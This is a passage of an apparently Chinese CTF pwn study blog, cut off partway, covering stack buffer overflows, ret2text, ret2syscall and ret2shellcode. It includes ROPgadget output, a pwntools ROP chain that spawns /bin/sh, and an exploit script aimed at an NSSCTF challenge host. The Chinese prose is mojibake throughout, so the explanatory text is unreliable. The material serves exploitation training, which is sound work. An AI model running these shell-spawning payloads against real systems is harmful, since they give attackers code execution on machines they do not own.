&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Ръю  ret2syscall ROPgadget --binary rop  --string &amp;#x27;/bin/sh&amp;#x27; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Strings information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x080be408 : /bin/sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	ТюђтљјтѕЎТў» int 80h уџётю░тЮђ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Ръю  ret2syscall ROPgadget --binary rop  --only &amp;#x27;int&amp;#x27;                 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x08049421 : int 0x80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x080938fe : int 0xbb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x080869b5 : int 0xf6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0807b4d4 : int 0xfc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unique gadgets found: 4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЃЈУ┐ЎТаи№╝їТїЅуЁДт»ётГўтЎеС╗ЦтЈітђ╝уџётЁ│у│╗№╝їСЙЮТгАт░єт»ётГўтЎеуй«СйЇТГБуА«уџётђ╝№╝їС╣ІтљјТЅДУАї int 80h№╝їтЇ│тЈ»УЙЙтѕ░ТГБуА«уџёу│╗у╗ЪУ░Ѓуће№╝їуЏИт║ћуџёУёџТюгтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&amp;#x27;./rop&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_eax_ret = 0x080bb196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_edx_ecx_ebx_ret = 0x0806eb90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int_0x80 = 0x08049421&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = 0x80be408&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = flat(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [&amp;#x27;A&amp;#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;h1 id=&#34;pwnтГдС╣аугћУ«░2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnтГдС╣аугћУ«░2&#34;&gt;#&lt;/a&gt; pwn тГдС╣аугћУ«░№╝ѕ2№╝Ѕ&lt;/h1&gt;
&lt;h2 id=&#34;1СИЅуДЇтИИУДЂуџёт»ётГўтЎе&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1СИЅуДЇтИИУДЂуџёт»ётГўтЎе&#34;&gt;#&lt;/a&gt; 1. СИЅуДЇтИИУДЂуџёт»ётГўтЎе№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	ax т»ётГўтЎе№╝џжђџућет»ётГўтЎе№╝їтЈ»ућеС║јтГўТћЙтцџуДЇТЋ░ТЇ«&lt;/p&gt;
&lt;p&gt;РђІ	bp т»ётГўтЎе№╝џтГўТћЙуџёТў»ТаѕтИДуџёТаѕт║Ћтю░тЮђ&lt;/p&gt;
&lt;p&gt;РђІ	sp т»ётГўтЎе№╝џтГўТћЙуџёТў»ТаѕжАХуџётю░тЮђ&lt;/p&gt;
&lt;h2 id=&#34;2ТаѕтИДСИјТаѕтиЦСйюуџёу«ђС╗І&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2ТаѕтИДСИјТаѕтиЦСйюуџёу«ђС╗І&#34;&gt;#&lt;/a&gt; 2. ТаѕтИДСИјТаѕтиЦСйюуџёу«ђС╗І№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ		ТаѕтИДТў»тГўтѓетЄйТЋ░уџёСИђС║ЏС┐АТЂ»уџётю░Тќ╣№╝їТаѕтИДтГўтѓеТюЅтЄйТЋ░уџёт▒ђжЃетЈўжЄЈ№╝їС╝ажђњу╗ЎтГљтЄйТЋ░уџёт«ъжЎЁтЈѓТЋ░№╝їуѕХтЄйТЋ░уџётю░тЮђС╗ЦтЈіСИіСИђСИфТаѕтИДТаѕт║Ћуџётю░тЮђ№╝їтцДУЄ┤ТЃЁтєхтдѓСИІ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/fb7f5e074f454da6b1459fd822dc9036.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	тюетЄйТЋ░У░ЃућеуџёУ┐ЄуеІСИГ№╝їждќтЁѕС╝џУ«▓ bp т»ётГўтЎеуџётђ╝У┐ЏУАїтјІТаѕ№╝їС╗ЦТќ╣СЙ┐тюеТЂбтцЇуџёТЌХтђЎТЂбтцЇТаѕт║Ћт»ётГўтЎеуџётђ╝№╝їтєЇС╣Ітљј№╝їС╝џТїЅжА║т║Јт░єт▒ђжЃетЈўжЄЈтјІТаѕ№╝їТюђтљјТў»тГљтЄйТЋ░уџёт«ъжЎЁтЈѓТЋ░№╝їС╝џТїЅуЁДтЁѕтЁЦТаѕуџётљјтЄ║Таѕ№╝їС╗јТюђтљјСИђСИфт«ъжЎЁтЈѓТЋ░тЁѕтЁЦТаѕтєЇтѕ░уггСИђСИфт«ъжЎЁтЈѓТЋ░№╝їТ»ћтдѓтЄйТЋ░ a (int a , int b)№╝їтјІТаѕуџёТќ╣т╝Јт░▒Тў»тЁѕтјІТаѕ b уџёт«ъжЎЁтЈѓТЋ░№╝їтєЇтјІТаѕ a уџёт«ъжЎЁтЈѓТЋ░№╝їтйЊУ┐ЎС║ЏтјІТаѕт«їТѕљС╣Ітљј№╝їт░▒тЈ»С╗ЦтјІТаѕуѕХтЄйТЋ░У░ЃућетГљтЄйТЋ░уџёжѓБТЮАУ»ГтЈЦуџёСИІСИђТЮАУ»ГтЈЦуџётю░тЮђ№╝їу┤ДТјЦуЮђ№╝їтЈ»С╗ЦтјІТаѕтйЊтЅЇТаѕтИДуџёТаѕт║Ћтю░тЮђС║єсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	тЁиСйЊуџёТ▒Єу╝ќУ»ГУеђт«ъуј░т░▒СИЇтцџтЂџУДБжЄіС║є№╝їтЏаСИ║ТѕЉУ┐ЎжЄїтЈфТў»у«ђУ┐░сђѓ&lt;/p&gt;
&lt;h2 id=&#34;3у╝Њтє▓тї║Т║бтЄ║Т╝ЈТ┤ъ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3у╝Њтє▓тї║Т║бтЄ║Т╝ЈТ┤ъ&#34;&gt;#&lt;/a&gt; 3. у╝Њтє▓тї║Т║бтЄ║Т╝ЈТ┤ъ№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	у╝Њтє▓тї║Т║бтЄ║ТЦ╝тЊдт»╣жѓБСИфуџёТюгУ┤ет░▒Тў»тљЉт«џжЋ┐уџёу╝Њтє▓тї║СИГтєЎтЁЦС║єУХЁжЋ┐уџёТЋ░ТЇ«№╝їжђаТѕљС║єтєЎтЁЦуџёТЋ░ТЇ«УдєуЏќС║єтЁХС╗ќтљѕТ│ЋуџётєЁтГўтї║тЪЪсђѓ&lt;/p&gt;
&lt;h2 id=&#34;4ТаѕТ║бтЄ║С╣Іret2text&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4ТаѕТ║бтЄ║С╣Іret2text&#34;&gt;#&lt;/a&gt; 4. ТаѕТ║бтЄ║С╣ІРђЊret2text№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;1тјЪуљє&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1тјЪуљє&#34;&gt;#&lt;/a&gt; №╝ѕ1№╝ЅтјЪуљє№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	ret2text т║ћУ»ЦТў»Тюђу«ђтЇЋуџёТаѕТ║бтЄ║Т╝ЈТ┤ътѕЕућеуџёТќ╣т╝ЈС╣ЪТў»Тюђу«ђтЇЋуџё№╝џ&lt;/p&gt;
&lt;p&gt;РђІ	тЂЄУ«Й№╝їтюеТаѕСИГ№╝їтГўтюетдѓСИІТЃЁтєх№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/ee2c57b57c254a6fb3f6f4edb0e9391b.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ&lt;/p&gt;
&lt;p&gt;тЁХ C уеІт║ЈТ║љС╗БуаЂтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;overflow&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;тйЊуеІт║ЈУ┐љУАїтѕ░ gets уџёТЌХтђЎ№╝їтЏаСИ║ gets Т▓АТюЅт»╣ућеТѕиУЙЊтЁЦуџётєЁт«╣уџёжЋ┐т║дУ┐ЏУАїжЎљтѕХ№╝їт░▒т»╝УЄ┤С║єТюгТЮЦТюђтцџУЙЊтЁЦ 8 тГЌУіѓуџётєЁт«╣№╝їу╗ЊТъюУЙЊтЁЦС║єУХЁУ┐Є 8 тГЌУіѓуџётєЁт«╣т»╝УЄ┤С║єТ║бтЄ║№╝їУдєуЏќТјЅС║є bp т»ётГўтЎеС╗ЦтЈіУ┐ћтЏътю░тЮђуџётђ╝№╝їтдѓСИІ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/46531ac3516e437caee9cd80941f185d.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	С╣Ітљј№╝їтЈ»С╗ЦжђџУ┐ЄтдѓСИіуџётјЪуљє№╝їт░єУ┐ћтЏътю░тЮђуџётђ╝С┐«Тћ╣СИ║уеІт║ЈУЄфтИдуџётљјжЌетЄйТЋ░№╝ѕтдѓ system (&amp;quot;/bin/sh&amp;quot;)№╝ЅСИГтЇ│тЈ»сђѓ&lt;/p&gt;
&lt;h3 id=&#34;2жбўуЏ«уц║СЙІnssctf-2022-spring-recruitr3m4ke&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2жбўуЏ«уц║СЙІnssctf-2022-spring-recruitr3m4ke&#34;&gt;#&lt;/a&gt; №╝ѕ2№╝ЅжбўуЏ«уц║СЙІРђЊ[NSSCTF 2022 Spring Recruit] R3m4ke?№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	ТІ┐тѕ░ ELF ТќЄС╗ХС╣ІтљјуггСИђТГЦт║ћУ»ЦтЁѕТБђТЪЦуЏИтЁ│уџёС┐ЮТіц№╝їтЏаСИ║С┐ЮТіцУ┐ЎжЄїУ┐ўТ▓АТюЅУ«▓№╝їТЅђС╗ЦУ┐ЎжЄїТІ┐тѕ░уџёТў»СИђСИфтЈфт╝ђС║є NX С┐ЮТіцуџёжбўуЏ«№╝їУ»ЦС┐ЮТіцт»╣У┐ЎжЂЊжбўтЄаС╣јТ▓АТюЅС╗ђС╣ѕтй▒тЊЇсђѓ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/7def99ff9bb140a2a03df9b1a04444cf.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	У┐ЎжЄїтЈ»С╗ЦуюІтЄ║№╝їУ┐ЎСИфТќЄС╗ХТў»СИђСИф 64 СйЇуџёт░ЈуФ»т║ЈТќЄС╗Х№╝їТЅђС╗ЦУ┐ЎжЄїСй┐уће IDA У┐ЏУАїтЈЇу╝ќУ»Љ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/9ac23fd3d87546dcb03b398658d926b9.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	У┐ЎжЄїтЈ»С╗ЦтЙѕуЏ┤УДѓуџётЈЉуј░№╝їУ»ЦтЄйТЋ░тБ░ТўјС║єСИђСИф 32 тГЌУіѓуџётЈўжЄЈ№╝їС╣ІтљјжђџУ┐Є gets () тЄйТЋ░ТЮЦтєЎтЁЦтєЁт«╣№╝їСйєТў»тЇ┤Т▓АТюЅт»╣жЋ┐т║дУ┐ЏУАїуЏИтЁ│уџёжЎљтѕХ№╝їтЏаТГцтГўтюеТ║бтЄ║Т╝ЈТ┤ъ№╝їУ┐ЎСИфТЌХтђЎт░▒тЈфжюђУдЂТЅЙтѕ░тљјжЌетЄйТЋ░уџётю░тЮђтЇ│тЈ»№╝їС╣ІтљјжђџУ┐Є Sheft+F12№╝їТЅЙтѕ░ /bin/sh У┐ЎСИфтГЌугдСИ▓№╝їуёХтљјУиЪУ┐Џ№╝їтЈЉуј░т«ЃтГўтюеС║јСИђСИфтЈФтЂџ LookAtMe () У┐ЎСИфтЄйТЋ░СИГ№╝їУ┐ЎжЄї№╝їС╣ЪтЈ»С╗ЦуЏ┤ТјЦС╗јтЄйТЋ░УДєтЏЙСИГТЅЙтѕ░тљјжЌе№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/2a634e35ccb943d381dd3777ceb0fc56.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	У┐ЎжЄїтЈ»С╗ЦТЅЙтѕ░тљјжЌетЄйТЋ░уџётю░тЮђ№╝їтЈі 0x40072C№╝їтЏаТГц№╝їУ┐ЎжЄїт░▒тЈ»С╗Цу╝ќтєЎ exp№╝їтдѓСИІ&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.anna.nssctf.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28043&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x40072C&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	У┐љУАїС╗БуаЂС╣ІтљјТѕљтіЪТІ┐тѕ░С║єуЏ«ТаЄСИ╗Тю║уџё shell№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/2c80dc47052b4c0b99da4499f6cf23e2.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;5ТаѕТ║бтЄ║С╣Іret2shellcode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5ТаѕТ║бтЄ║С╣Іret2shellcode&#34;&gt;#&lt;/a&gt; 5. ТаѕТ║бтЄ║С╣ІРђЊret2shellcode№╝џ&lt;/h2&gt;
&lt;h3 id=&#34;1тјЪуљє-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1тјЪуљє-2&#34;&gt;#&lt;/a&gt; №╝ѕ1№╝ЅтјЪуљє№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	У»ЦТќ╣Т│ЋтјЪуљєСИј ret2shellcode у▒╗С╝╝№╝їтЈфТў»№╝їтјЪТюгтГўтюеуџётљјжЌеТ▓АТюЅС║є№╝їСйєТў»у╗ЎС║єУХ│тцЪуџётЈ»тєЎтЁЦуџётю░Тќ╣С║јућеТѕитєЎтЁЦ shellcode С╗БуаЂ№╝їУ┐ЎжЄїтЅЇТюЪтГўтюеСИцуДЇТќ╣Т│ЋтєЎтЁЦ shellcode№╝їуггСИђуДЇТў»тєЎтЁЦ Stack СИГ№╝їуггС║їуДЇТў»тєЎтЁЦ bss Т«х№╝їтЄєуА«тю░У»┤№╝їт┐ЁжА╗тйЊСИђСИфТ«хСИГтГўтюетЈ»тєЎтЈ»ТЅДУАїуџёТЮЃжЎљТЌХТЅЇУЃйУ┐ЏУАї ret2shellcodeсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	ТГЦжфцтцДУЄ┤Тў»№╝їждќтЁѕС┐«Тћ╣СИІСИђС║ЏжЁЇуй«С┐АТЂ»№╝їТ»ћтдѓ context.arch№╝їтйЊуеІт║ЈТЌХ 64 СйЇТЌХ№╝їт║ћУ»ЦУ«▓ТГцС┐«Тћ╣СИ║ amd64№╝ЏС╣Ітљј№╝їУ«Е python уеІт║ЈУЄфтіеућЪТѕљСИђСИф shellcode ТѕќУђЁтј╗уЏИт║ћуџётю░Тќ╣ТЅЙ№╝їpython уџёуЏИтЁ│С╗БуаЂТў»№╝џshellcraft [.amd64].sh ()№╝ЏС╣ІтљјжђџУ┐Є asm () тЄйТЋ░т░єућЪТѕљуџё shllcode у╝ќУ»ЉТѕљТю║тЎеуаЂ№╝ЏуёХтљјт░▒Тў»тЈЉжђЂуЏИтЁ│уџётъЃтюЙТЋ░ТЇ«С╣Іу▒╗уџёУ┐ЏУАїтљју╗ГТЊЇСйюсђѓ&lt;/p&gt;
&lt;h3 id=&#34;2жбўуЏ«ТАѕСЙІhnctf-2022-week1ret2shellcode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2жбўуЏ«ТАѕСЙІhnctf-2022-week1ret2shellcode&#34;&gt;#&lt;/a&gt; №╝ѕ2№╝ЅжбўуЏ«ТАѕСЙІРђЊ[HNCTF 2022 Week1] ret2shellcode&lt;/h3&gt;
&lt;p&gt;РђІ	тЁѕТЪЦуюІт«ЃуџёС┐ЮТіцу▒╗тъІ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/c1a04d4871a6468a9009b2ab3e122848.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;тЈЉуј░УиЪСИіСИђСИфСИђУЄ┤№╝їУ┐ЎжЄїтЈ»С╗Цу«ђтЇЋУ»┤СИІ NX С┐ЮТіц№╝їNX С┐ЮТіцТў»ТаѕСИЇтЈ»ТЅДУАї№╝їт╝ђтљ»С║єУ┐ЎСИфС┐ЮТіцС╣Ітљј№╝їтюеТаѕСИітєЎтЁЦуџё shellcode т░єСИЇС╝џтЏаСИ║ТѕЉС╗гС┐«Тћ╣уџё return address уџётђ╝УђїТЅДУАї№╝їтЏаТГц№╝їТѕЉС╗гтЈ»С╗ЦТііуЏ«ТаЄТћЙтѕ░ bss Т«хСИі№╝їСИЇУ┐Є№╝їждќтЁѕУ┐ўТў»тЙЌуА«С┐Ю bss Т«хТў»тљдтГўтюетЈ»ТЅДУАїТЮЃжЎљсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	т»╣С║јУ┐ЎжЂЊжбў№╝їждќтЁѕт║ћУ»ЦтЈЇу╝ќУ»Љ№╝їтЙЌтѕ░С╝фС╗БуаЂ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/bae3083c571a4f3ca431d421ec703486.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;ТѕЉС╗гтЈ»С╗ЦтЈЉуј░№╝їтюе main тЄйТЋ░СИГ№╝їУ┐ЎжЄїт╣ХТ▓АТюЅућЪтЉй buff тЈўжЄЈ№╝ї СйєТў»У┐ЎжЄїтЇ┤тЈ»С╗ЦуЏ┤ТјЦСй┐уће№╝їУ»┤Тўј buff Тў»тюетЁет▒ђтЈўжЄЈСИГУ┐ЏУАїуџётБ░Тўј№╝їтЏаТГцУ┐ЎжЄїУиЪУ┐ЏУ┐ЎСИфтЈўжЄЈ№╝їтЈЉуј░тЁХтюе bss Т«хСИГ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/b596d670671f4ecf843459c14d1a037c.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;тЈдтцќ№╝їжђџУ┐Є pwndbg уџё vmmap тЉйС╗цтЈ»С╗ЦуЪЦжЂЊУ┐ЎТ«хтєЁтГўтГўтюетЈ»ТЅДУАїуџёТЮЃжЎљ№╝џ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/2b6bc44c1d3448dcbf4a298ef01afe7a.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;тЏаТГц№╝їУ┐ЎСИфжбўуЏ«уџёТђЮУи»т░▒тЙѕТўјС║єС║є№╝їждќтЁѕТў»уеІт║ЈуџётѕєТъљ№╝їжђџУ┐ЄтєЎтЁЦтГЌугдСИ▓у╗Ў s№╝їуёХтљјт░є s уџётєЁт«╣тцЇтѕХу╗Ў buff№╝їжЎљтѕХуџё s уџётєЎтЁЦжЋ┐т║джЋ┐С║ј 256 тГЌУіѓ№╝їтЏаТГцтГўтюеу╝Њтє▓тї║Т║бтЄ║Т╝ЈТ┤ъ№╝їУ┐ЎжЄїт░▒тЙѕТўјС║єС║є№╝їС╗БуаЂтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span 